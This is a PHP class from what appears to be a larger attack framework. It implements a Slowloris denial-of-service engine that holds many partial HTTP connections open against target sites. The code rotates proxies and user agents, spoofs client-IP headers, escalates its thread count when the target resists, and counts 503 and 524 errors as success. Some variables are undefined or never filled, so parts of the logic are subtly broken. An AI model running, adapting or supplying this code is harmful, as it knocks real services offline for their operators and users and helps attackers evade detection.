<?php

require_once __DIR__ . '/../database.php';
require_once __DIR__ . '/../stealth_engine_class.php';
require_once __DIR__ . '/../client_profile_class.php';
require_once __DIR__ . '/../tls_profile_class.php';
require_once __DIR__ . '/../proxy_manager_class.php';

class SlowlorisJSEngine {
    private $db;
    private $config;
    private $stealthEngine;
    private $clientProfile;
    private $tlsProfile;
    private $proxyManager;
    private $activeConnections;
    
    public function __construct($database, $config = []) {
        $this->db = $database;
        $this->config = array_merge($this->getDefaultConfig(), $config);
        $this->stealthEngine = null;
        $this->clientProfile = new ClientProfile();
        $this->tlsProfile = new TLSProfile();
        $this->proxyManager = new ProxyManager();
        $this->activeConnections = [];
    }
    
    public function getDefaultConfig() {
        return [
            'method' => 'SLOWLORIS_JS',
            'threads' => 200,
            'duration' => 600,
            'connection_hold_time' => 300,
            'partial_request_delay' => 10,
            'header_send_interval' => 15,
            'max_connections_per_thread' => 10,
            'stealth_enabled' => true,
            'proxy_rotation' => true,
            'ua_rotation' => true,
            'header_spoofing' => true,
            'keep_alive_enabled' => true,
            'random_headers' => true,
            'connection_timeout' => 60,
            'escalation_factor' => 1.4,
            'resistance_threshold' => 0.7
        ];
    }
    
    public function start($targets, $stealthSessionId = null) {
        $this->logMessage("Starting SLOWLORIS_JS attack on " . count($targets) . " targets");
        
        if ($this->config['stealth_enabled'] && $stealthSessionId) {
            $this->stealthEngine = new StealthEngine();
            $this->stealthEngine->loadSession($stealthSessionId);
        }
        
        $results = [];
        $startTime = time();
        
        foreach ($targets as $target) {
            $results[$target] = $this->executeSlowlorisAttack($target, $startTime);
        }
        
        return [
            'status' => 'completed',
            'method' => 'SLOWLORIS_JS',
            'targets' => count($targets),
            'results' => $results,
            'total_connections' => array_sum(array_column($results, 'total_connections')),
            'max_concurrent' => array_sum(array_column($results, 'max_concurrent')),
            'average_hold_time' => $this->calculateAverageHoldTime($results)
        ];
    }
    
    private function executeSlowlorisAttack($target, $startTime) {
        $this->logMessage("Executing SLOWLORIS_JS attack on $target");
        
        $totalConnections = 0;
        $maxConcurrent = 0;
        $currentConnections = [];
        $currentThreads = $this->config['threads'];
        $errorCodes = [];
        
        while (true) {
            if ($this->shouldStop($groupId)) {
                $this->logMessage("Manual stop signal received for group: $groupId");
                break;
            }
            
            if ($this->isSuccessConditionMet($target, $groupId, $errorCodes)) {
                $this->logMessage("Success condition met for target: $target in group: $groupId");
                break;
            }
            
            for ($thread = 0; $thread < $currentThreads; $thread++) {
                if (count($currentConnections) < ($currentThreads * $this->config['max_connections_per_thread'])) {
                    $connection = $this->createSlowConnection($target);
                    if ($connection) {
                        $currentConnections[] = $connection;
                        $totalConnections++;
                    }
                }
                
                usleep(rand(100000, 500000));
            }
            
            $currentConnections = $this->maintainConnections($currentConnections, $target);
            $maxConcurrent = max($maxConcurrent, count($currentConnections));
            
            if ($this->config['stealth_enabled'] && $totalConnections % 50 === 0) {
                $this->rotateStealthComponents();
            }
            
            if ($this->shouldEscalate($errorCodes, $totalConnections)) {
                $currentThreads = $currentThreads * $this->config['escalation_factor'];
                $this->logMessage("Escalated threads to $currentThreads for $target");
            }
            
            if ($totalConnections % 100 === 0) {
                $this->logProgress($target, $totalConnections, count($currentConnections));
            }
            
            sleep(1);
        }
        
        $this->closeAllConnections($currentConnections);
        
        return [
            'target' => $target,
            'total_connections' => $totalConnections,
            'max_concurrent' => $maxConcurrent,
            'final_threads' => $currentThreads,
            'average_hold_time' => $this->config['connection_hold_time'],
            'error_codes' => array_count_values($errorCodes)
        ];
    }
    
    private function createSlowConnection($target) {
        $headers = $this->buildSlowHeaders();
        $proxy = $this->config['proxy_rotation'] ? $this->proxyManager->getActiveProxy() : null;
        
        $parsedUrl = parse_url($target);
        $host = $parsedUrl['host'];
        $port = $parsedUrl['port'] ?? ($parsedUrl['scheme'] === 'https' ? 443 : 80);
        $path = $parsedUrl['path'] ?? '/';
        
        $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
        if (!$socket) {
            return null;
        }
        
        socket_set_option($socket, SOL_SOCKET, SO_RCVTIMEO, ['sec' => $this->config['connection_timeout'], 'usec' => 0]);
        socket_set_option($socket, SOL_SOCKET, SO_SNDTIMEO, ['sec' => $this->config['connection_timeout'], 'usec' => 0]);
        
        if ($proxy) {
            $connected = @socket_connect($socket, $proxy['ip'], $proxy['port']);
        } else {
            $connected = @socket_connect($socket, $host, $port);
        }
        
        if (!$connected) {
            socket_close($socket);
            return null;
        }
        
        $request = "GET $path HTTP/1.1\r\n";
        $request .= "Host: $host\r\n";
        $request .= "User-Agent: " . $this->clientProfile->getCurrentUserAgent() . "\r\n";
        
        if ($this->config['keep_alive_enabled']) {
            $request .= "Connection: keep-alive\r\n";
        }
        
        foreach ($headers as $header) {
            $request .= "$header\r\n";
        }
        
        socket_write($socket, $request);
        
        return [
            'socket' => $socket,
            'target' => $target,
            'created_at' => time(),
            'last_activity' => time(),
            'headers_sent' => count($headers)
        ];
    }
    
    private function maintainConnections($connections, $target) {
        $activeConnections = [];
        
        foreach ($connections as $connection) {
            $socket = $connection['socket'];
            $age = time() - $connection['created_at'];
            $timeSinceActivity = time() - $connection['last_activity'];
            
            if ($age > $this->config['connection_hold_time']) {
                socket_close($socket);
                continue;
            }
            
            if ($timeSinceActivity > $this->config['header_send_interval']) {
                $additionalHeader = $this->generateRandomHeader();
                $headerData = "$additionalHeader\r\n";
                
                $written = @socket_write($socket, $headerData);
                if ($written === false) {
                    socket_close($socket);
                    continue;
                }
                
                $connection['last_activity'] = time();
                $connection['headers_sent']++;
            }
            
            $activeConnections[] = $connection;
        }
        
        return $activeConnections;
    }
    
    private function buildSlowHeaders() {
        $headers = [
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language: en-US,en;q=0.5',
            'Accept-Encoding: gzip, deflate',
            'Cache-Control: no-cache'
        ];
        
        if ($this->config['header_spoofing']) {
            $headers[] = 'X-Forwarded-For: ' . $this->generateRandomIP();
            $headers[] = 'X-Real-IP: ' . $this->generateRandomIP();
            $headers[] = 'X-Originating-IP: ' . $this->generateRandomIP();
        }
        
        if ($this->config['random_headers']) {
            $randomHeaders = [
                'X-Requested-With: XMLHttpRequest',
                'X-Custom-Header: ' . uniqid(),
                'X-Session-ID: ' . bin2hex(random_bytes(16)),
                'X-Request-ID: ' . uniqid(),
                'X-Client-Version: ' . rand(1, 100) . '.' . rand(0, 99),
                'X-API-Key: ' . bin2hex(random_bytes(20))
            ];
            
            $headers = array_merge($headers, array_slice($randomHeaders, 0, rand(2, 4)));
        }
        
        return $headers;
    }
    
    private function generateRandomHeader() {
        $headerNames = [
            'X-Custom-Data',
            'X-Session-Token',
            'X-Request-Time',
            'X-Client-Info',
            'X-Browser-Info',
            'X-Screen-Resolution',
            'X-Timezone',
            'X-Language-Preference'
        ];
        
        $name = $headerNames[array_rand($headerNames)];
        $value = bin2hex(random_bytes(rand(8, 32)));
        
        return "$name: $value";
    }
    
    private function generateRandomIP() {
        return rand(1, 254) . '.' . rand(1, 254) . '.' . rand(1, 254) . '.' . rand(1, 254);
    }
    
    private function closeAllConnections($connections) {
        foreach ($connections as $connection) {
            socket_close($connection['socket']);
        }
    }
    
    private function rotateStealthComponents() {
        if ($this->stealthEngine) {
            $rotations = $this->stealthEngine->performEvolutionCycle();
            $this->logMessage("Stealth evolution cycle completed: " . implode(', ', $rotations));
        } else {
            if ($this->config['proxy_rotation']) {
                $this->proxyManager->rotateProxy();
            }
            if ($this->config['ua_rotation']) {
                $this->clientProfile->rotateUserAgent();
            }
        }
    }
    
    private function shouldEscalate($errorCodes, $connectionCount) {
        if ($connectionCount < 100) return false;
        
        $recentErrors = array_slice($errorCodes, -50);
        $errorRate = count($recentErrors) / min(50, $connectionCount);
        
        return $errorRate > $this->config['resistance_threshold'];
    }
    
    private function calculateAverageHoldTime($results) {
        $totalHoldTime = array_sum(array_column($results, 'average_hold_time'));
        $targetCount = count($results);
        
        return $targetCount > 0 ? $totalHoldTime / $targetCount : 0;
    }
    
    private function logProgress($target, $totalConnections, $activeConnections) {
        $this->logMessage("SLOWLORIS_JS Progress - Target: $target, Total: $totalConnections, Active: $activeConnections");
    }
    
    private function shouldStop($groupId) {
        $stopFile = "/tmp/stop_signal_$groupId.flag";
        return file_exists($stopFile);
    }
    
    private function isSuccessConditionMet($target, $groupId, $errorCodes) {
        if (empty($errorCodes)) return false;
        
        $totalRequests = array_sum($errorCodes);
        if ($totalRequests < 100) return false;
        
        $successCodes = [404, 410, 503, 524];
        $successCount = 0;
        
        foreach ($successCodes as $code) {
            $successCount += $errorCodes[$code] ?? 0;
        }
        
        $successRate = $successCount / $totalRequests;
        
        if ($successRate >= 0.75) {
            $statusFile = "/tmp/success_status_$groupId.json";
            $status = [
                'target' => $target,
                'success_rate' => $successRate,
                'total_requests' => $totalRequests,
                'success_count' => $successCount,
                'timestamp' => time(),
                'condition_met' => true
            ];
            file_put_contents($statusFile, json_encode($status));
            return true;
        }
        
        return false;
    }
    
    private function logMessage($message) {
        $logFile = './logs/backend.log';
        $logDir = dirname($logFile);
        if (!is_dir($logDir)) {
            mkdir($logDir, 0755, true);
        }
        $timestamp = date('Y-m-d H:i:s');
        $logEntry = "[$timestamp] SLOWLORIS_JS_ENGINE: $message" . PHP_EOL;
        file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);
    }
}

?>
